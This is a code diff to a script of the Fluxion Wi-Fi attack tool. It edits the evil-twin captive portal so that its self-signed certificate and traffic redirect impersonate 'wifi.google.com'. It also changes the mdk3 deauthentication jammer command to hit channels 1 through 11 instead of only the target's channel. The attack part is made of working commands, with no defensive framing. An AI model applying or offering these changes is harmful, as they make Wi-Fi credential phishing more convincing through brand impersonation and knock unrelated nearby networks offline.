@@ -290,7 +290,7 @@ captive_portal_set_authenticator() {
 captive_portal_run_certificate_generator() {
   xterm -bg "#000000" -fg "#CCCCCC" \
     -title "Generating Self-Signed SSL Certificate" -e openssl req \
-    -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' \
+    -subj '/CN=wifi.google.com/O=CaptivePortal/OU=Networking/C=US' \
     -new -newkey rsa:2048 -days 365 -nodes -x509 \
     -keyout "$FLUXIONWorkspacePath/server.pem" \
     -out "$FLUXIONWorkspacePath/server.pem"
@@ -733,10 +733,10 @@ index-file.names = (
   else
     echo "\
 # Redirect all traffic to the captive portal when not emulating a connection.
-\$HTTP[\"host\"] != \"captive.gateway.lan\" {
+\$HTTP[\"host\"] != \"wifi.google.com\" {
     url.redirect-code = 302
     url.redirect  = (
-        \"^/(.*)\" => \"http://captive.gateway.lan/\",
+        \"^/(.*)\" => \"http://wifi.google.com/\",
     )
 }
 " >>"$FLUXIONWorkspacePath/lighttpd.conf"
@@ -1523,7 +1523,7 @@ start_attack() {
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+        "mdk3 $CaptivePortalJammerInterface d -c 1,2,3,4,5,6,7,8,9,10,11 -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
 
